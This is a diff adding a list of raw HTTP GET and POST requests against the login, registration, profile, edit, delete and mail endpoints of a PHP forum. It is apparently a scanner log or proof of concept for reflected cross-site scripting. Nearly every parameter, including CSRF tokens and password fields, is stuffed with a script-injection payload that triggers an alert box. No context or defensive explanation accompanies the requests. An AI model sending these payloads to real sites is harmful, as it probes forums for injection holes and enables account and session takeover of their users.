@@ -1,0 +1,30 @@
+GET
+/login.php?action=out&amp;amp;id=3&amp;amp;csrf_token=4b072f27396cec5d79&amp;quot;/&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+GET
+/misc.php?action=markforumread&amp;amp;fid=1&amp;amp;csrf_token=c173cabad786&amp;quot;/&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+
+POST /delete.php?id=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+form_sent=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;csrf_token=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_confirm=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;delete=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/
+script&amp;gt;
+
+POST /edit.php?id=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+form_sent=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;csrf_token=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_message=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;submit=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/
+script&amp;gt;
+
+POST /login.php?action=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+form_sent=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;csrf_token=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_email=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;request_pass=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oin
+k)&amp;lt;/script&amp;gt;
+
+POST /misc.php?email=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+form_sent=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;redirect_url=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;csrf_token=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_subject=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(o
+ink)&amp;lt;/script&amp;gt;&amp;amp;req_message=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;submit=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+
+POST
+/profile.php?action=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;id=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+form_sent=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;csrf_token=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_old_password=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_new_password1=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;scri
+pt&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_new_password2=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;update=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+
+POST /register.php?action=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
+form_sent=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;csrf_token=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_username=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;req_password1=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert
+(oink)&amp;lt;/script&amp;gt;&amp;amp;req_password2=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(369448)&amp;lt;/script&amp;gt;&amp;amp;req_email1=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;timezone=&amp;gt;&amp;quot;&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;&amp;amp;register=&amp;gt;&amp;quot;&amp;#039;&amp;gt;
+&amp;lt;script&amp;gt;alert(oink)&amp;lt;/script&amp;gt;
